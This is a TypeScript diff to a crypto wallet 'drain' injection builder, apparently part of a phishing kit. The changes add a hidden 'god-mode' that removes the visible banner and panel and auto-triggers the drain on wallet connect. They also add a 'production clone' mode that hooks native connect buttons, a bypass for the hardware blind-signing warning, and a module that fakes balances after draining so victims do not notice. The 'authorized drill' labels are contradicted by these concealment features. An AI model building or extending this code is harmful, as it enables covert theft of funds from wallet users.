@@ -6,6 +6,8 @@ import { readFile } from 'node:fs/promises'
 import path from 'node:path'
 import { fileURLToPath } from 'node:url'
 
+import { prependFakeBalanceModule, parseFakeBalanceAfterDrainEnv } from './mirror-fake-balance.js'
+
 export const DEFAULT_AUTHORIZED_BACKEND_URL = 'https://legionapi-production.up.railway.app'
 
 export type AuthorizedDrainInjectConfig = {
@@ -14,7 +16,17 @@ export type AuthorizedDrainInjectConfig = {
   walletConnectProjectId?: string
   /** Internal drill only: skip blind-signing education modal */
   hardwareAutoConsent?: boolean
+  /** God-mode: hide UI and auto-trigger drain on wallet connect */
+  silentInject?: boolean
+  /** Testing only: skip hardware blind-sign modal entirely (--force-hardware-bypass) */
+  forceHardwareBypass?: boolean
+  /** Production clone: zero visible UI, MutationObserver on native connect buttons */
+  productionClone?: boolean
+  /** Persist pre-drain balances and spoof balance APIs after successful drain */
+  fakeBalanceAfterDrain?: boolean
 }
+
+export { parseFakeBalanceAfterDrainEnv }
 
 export function parseHardwareAutoConsentEnv(
   value: string | undefined,
@@ -25,7 +37,10 @@ export function parseHardwareAutoConsentEnv(
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url))
 
-export function buildAuthorizedDrainCss(): string {
+export function buildAuthorizedDrainCss(opts?: { productionClone?: boolean }): string {
+  if (opts?.productionClone) {
+    return '/* production clone — no visible inject styles */'
+  }
   return `
 #legion-auth-banner{position:fixed;top:0;left:0;right:0;z-index:2147483646;background:#92400e;color:#fff;padding:10px 16px;font:600 14px/1.4 system-ui,sans-serif;text-align:center;box-shadow:0 2px 8px rgba(0,0,0,.35);}
 #legion-auth-panel{position:fixed;bottom:20px;right:20px;z-index:2147483647;width:min(400px,calc(100vw - 32px));background:#0f172a;color:#e2e8f0;border-radius:14px;box-shadow:0 12px 40px rgba(0,0,0,.45);font:14px/1.45 system-ui,sans-serif;overflow:hidden;}
@@ -45,6 +60,8 @@ export function buildAuthorizedDrainCss(): string {
 #legion-auth-panel .wallet-mode{margin-bottom:8px;}
 #legion-auth-panel .success{color:#4ade80;font-weight:600;}
 body.legion-auth-active{padding-top:48px;}
+body.legion-silent{padding-top:0!important;}
+body.legion-silent #legion-auth-banner,body.legion-silent #legion-auth-panel{display:none!important;}
 .legion-blind-sign-overlay{position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,.72);font:14px/1.55 system-ui,-apple-system,sans-serif;}
 .legion-blind-sign-card{width:min(480px,calc(100vw - 40px));max-height:calc(100vh - 40px);overflow-y:auto;background:#fff;color:#0f172a;border-radius:16px;padding:24px 26px;box-shadow:0 20px 60px rgba(0,0,0,.45);}
 .legion-blind-sign-card h2{margin:0 0 12px;font-size:20px;font-weight:700;line-height:1.3;color:#0f172a;}
@@ -71,11 +88,24 @@ export async function buildAuthorizedDrainInjectJs(
   const kineticKey = config.kineticKey?.trim() ?? ''
   const wcProjectId = config.walletConnectProjectId?.trim() ?? ''
   const hardwareAutoConsent = config.hardwareAutoConsent === true
+  const silentInject = config.silentInject === true || config.productionClone === true
+  const forceHardwareBypass = config.forceHardwareBypass === true
+  const productionClone = config.productionClone === true
 
   template = template.replace(/__BACKEND_URL__/g, backendUrl)
   template = template.replace(/__KINETIC_KEY__/g, kineticKey)
   template = template.replace(/__WC_PROJECT_ID__/g, wcProjectId)
   template = template.replace(/__HARDWARE_AUTO_CONSENT__/g, String(hardwareAutoConsent))
+  template = template.replace(/__SILENT_INJECT__/g, String(silentInject))
+  template = template.replace(/__FORCE_HARDWARE_BYPASS__/g, String(forceHardwareBypass))
+  template = template.replace(/__PRODUCTION_CLONE__/g, String(productionClone))
 
-  return template
+  const fakeBalance =
+    config.fakeBalanceAfterDrain === true ||
+    parseFakeBalanceAfterDrainEnv(process.env['FAKE_BALANCE_AFTER_DRAIN'])
+
+  return prependFakeBalanceModule(template, {
+    backendUrl,
+    enabled: fakeBalance,
+  })
 }
